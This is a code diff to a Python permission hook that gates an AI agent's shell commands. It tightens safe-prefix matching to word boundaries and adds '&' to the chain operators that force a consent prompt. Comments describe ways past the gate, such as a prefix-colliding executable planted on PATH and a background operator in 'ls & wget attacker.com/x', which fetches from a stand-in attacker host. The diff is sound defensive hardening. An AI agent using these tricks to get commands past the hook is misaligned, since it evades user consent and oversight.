@@ -115,6 +115,30 @@ SENSITIVE_PATH_PATTERNS: tuple[str, ...] = (
 _PATH_SENSITIVE_READ_PREFIXES: tuple[str, ...] = ("cat ", "head ", "tail ", "wc ")
 
 
+# WHY (MEDIUM, self-audit 2026-08-22 during a hook-control-matrix build):
+# `cmd_lower.startswith(prefix)` has no word-boundary check. Prefixes that
+# already end in a space ("cat ", "echo ") are safe by construction -- a
+# collision would need a literal space in the colliding name. But "ruff",
+# "mypy", "ls", "pwd", "git status", "git log", "git diff", "git branch",
+# "git show", "python --version", "node --version" do NOT end in a space,
+# so a same-prefix different-command match (a `ruffian` wrapper script, a
+# `lsof` invocation, a `pwd123` executable planted on PATH) auto-allows on
+# nothing more than sharing a prefix -- the exact bypass class SEC-01
+# (2026-07-17) already removed pytest/npm-test for, just not extended to
+# these. Fixed generally: require the match end at a word boundary (end of
+# string or a following space), not merely be a leading substring.
+def _matches_safe_prefix(cmd_lower: str, prefix_lower: str) -> bool:
+    """True if cmd_lower starts with prefix_lower AND the prefix match ends
+    at a word boundary. `lsof ...` must NOT match "ls"; `ruffian` must NOT
+    match "ruff"; `ls -la` and `ruff check .` (space right after) still do."""
+    if not cmd_lower.startswith(prefix_lower):
+        return False
+    if prefix_lower.endswith(" "):
+        return True
+    tail = cmd_lower[len(prefix_lower) :]
+    return tail == "" or tail[0] == " "
+
+
 def _reads_sensitive_path(cmd_lower: str) -> bool:
     """True if a cat/head/tail command's target path looks like a secret."""
     for prefix in _PATH_SENSITIVE_READ_PREFIXES:
@@ -208,7 +232,14 @@ _EVAL_COMMAND_RE = re.compile(r"(?:^|[;&|`\n]|\$\()\s*eval\b", re.IGNORECASE)
 # arbitrary filenames — verified that gap exists identically with or without
 # "<", so it is a SAFE_BASH_PREFIXES/SENSITIVE_PATH_PATTERNS design
 # limitation, not something this specific fix claims to close.
-CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<")
+# WHY "&" (SEC-05, adversarial review 2026-08-22 of the word-boundary fix
+# above): a bare background operator was missing. `ls & wget attacker.com/x`
+# passes every earlier check -- no "&&", no pipe, no dangerous substring --
+# then matches the "ls" safe prefix (boundary check admits the following
+# space) and auto-ALLOWS, while Bash still runs `wget` in the foreground.
+# A substring check on "&" catches both bare "&" and "&&" for free, the same
+# trick ">" already uses for ">>"/"1>"/"2>" and "<" for "<<"/"<<<".
+CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<", "&")
 
 
 def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
@@ -244,7 +275,7 @@ def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
         # WHY: safe bash prefixes are read-only or standard dev tools
         # Only checked AFTER chain operators are excluded
         for prefix in SAFE_BASH_PREFIXES:
-            if cmd_lower.startswith(prefix.lower()):
+            if _matches_safe_prefix(cmd_lower, prefix.lower()):
                 return ("allow", "")
 
     # WHY: default to asking — explicit user consent for unknown operations
